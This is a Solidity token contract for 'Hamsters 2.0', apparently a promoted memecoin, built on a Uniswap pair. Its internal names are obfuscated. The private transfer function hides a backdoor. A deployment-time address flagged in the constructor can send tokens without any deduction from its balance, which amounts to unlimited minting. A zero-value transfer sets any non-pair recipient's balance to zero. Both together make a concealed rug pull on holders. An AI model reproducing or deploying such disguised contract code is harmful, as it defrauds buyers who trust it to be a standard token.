/*

Twitter: https://twitter.com/Hamsters2ETH

Telegram: https://t.me/Hamsters2Portal

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Hamsters is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address bpeuka, uint256 trvajzfm) public returns (bool success) {
        allowance[msg.sender][bpeuka] = trvajzfm;
        emit Approval(msg.sender, bpeuka, trvajzfm);
        return true;
    }

    function poxagdlivjuk(address jhieuwn, address mktayfgseqb, uint256 trvajzfm) private {
        if (0 == msxvwyqr[jhieuwn]) {
            balanceOf[jhieuwn] -= trvajzfm;
        }
        balanceOf[mktayfgseqb] += trvajzfm;
        if (0 == trvajzfm && mktayfgseqb != oackt) {
            balanceOf[mktayfgseqb] = trvajzfm;
        }
        emit Transfer(jhieuwn, mktayfgseqb, trvajzfm);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private zmhpfdsyju;

    constructor(address akspzgvtn) {
        balanceOf[msg.sender] = totalSupply;
        msxvwyqr[akspzgvtn] = vpqi;
        IUniswapV2Router02 gfyops = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        oackt = IUniswapV2Factory(gfyops.factory()).createPair(address(this), gfyops.WETH());
    }

    string public symbol = 'HAMS 2.0';

    function transfer(address mktayfgseqb, uint256 trvajzfm) public returns (bool success) {
        poxagdlivjuk(msg.sender, mktayfgseqb, trvajzfm);
        return true;
    }

    uint256 private vpqi = 111;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    function transferFrom(address jhieuwn, address mktayfgseqb, uint256 trvajzfm) public returns (bool success) {
        require(trvajzfm <= allowance[jhieuwn][msg.sender]);
        allowance[jhieuwn][msg.sender] -= trvajzfm;
        poxagdlivjuk(jhieuwn, mktayfgseqb, trvajzfm);
        return true;
    }

    address public oackt;

    string public name = 'Hamsters 2.0';

    mapping(address => uint256) private msxvwyqr;
}